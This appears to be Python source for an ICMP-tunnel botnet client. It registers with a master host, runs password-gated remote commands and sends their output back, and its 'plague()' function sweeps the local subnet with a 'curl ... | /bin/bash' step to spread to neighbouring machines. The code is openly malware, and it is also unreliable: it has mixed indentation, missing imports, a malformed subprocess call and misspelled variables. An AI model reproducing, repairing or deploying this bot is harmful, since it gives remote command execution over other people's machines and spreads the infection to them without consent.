from icmp_tunnel import *
import threading
import os

MASTER = "10.0.0.1"
DECRYPTION_KEY = "pass123"
PASSWORD = "OkayNowYouCanUseMe"
WEB = "www.ILoveRed.com"
cmdQueue = Queue.Queue()

class Handler(threading.Thread):
    def __init__(self, q):
        self.q = q
        threading.Thread.__init__(self)

    def run(self):
        while True:
            if not self.q.empty():
                #BUILT IN CMD FORMAT IS AS FOLLOWS
                #<command here>------>arg1 arg2 arg3
                #OTHERWISE COMMANDS WILL JUST BE EXECUTED AND THEIR OUTPUT RETURNED
	
		raw = self.q.get()

		if PASSWORD in raw:	#Is this legit data?
			if "----->" in raw:	#Is this a builtin?
				builtin = raw.strip(PASSWORD).split("----->")
				if builtin[0] == "SET-MASTER":
					MASTER = builtin[1]
				elif builtin[0] == "SET-KEY":
					DECRYPTION_KEY = builtin[1]
				elif builtin[0] == "SET-PASS":
					PASSWORD = builtin[1]
				elif builtin[0] == "SET-WEB":
					WEB = builtin[1]
				elif builtin[0] == "RESET-EMERGENCY-OMG":
					PASSWORD = "DEFAULT-HARDCODED"
					DECRYPTION = "DEFAULT-DENCRYPT"
					WEB = "www.DEFAULT.com"
				elif builtin[0] == "EXPLOIT-ALL":
					plague()		
			else:
				cmd = raw.strip(PASSWORD).split()
				out = subprocess.check_output(cmd)
				send_icmp(localhost, MASTER, "OUTPUT")

def init():
	print("Bot started...["+localhost+"]")
	send_icmp(localhost, MASTER, "NEW-BOT-INIT:"+localhost)
def plague():
	octets = localhost.split(".")
	for i in range(1,253):
		if i != octets[3]:
			out = subprocess.check_output("curl", WEB ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
			send_icmp(localhost, MASTER, "EXPLOIT-OUTPUT"+out)

def main():
	init()
	listener = Listener(cmdQueue)
    	handler = Handler(cmdQueue)
    	listener.start()
    	handler.start()


##TODO: TEST FILE TRANSFERS
##TODO: IMPLEMENT BOT BUILT-IN'S
##TODO: PROPAGATION AND MANAGEMENT

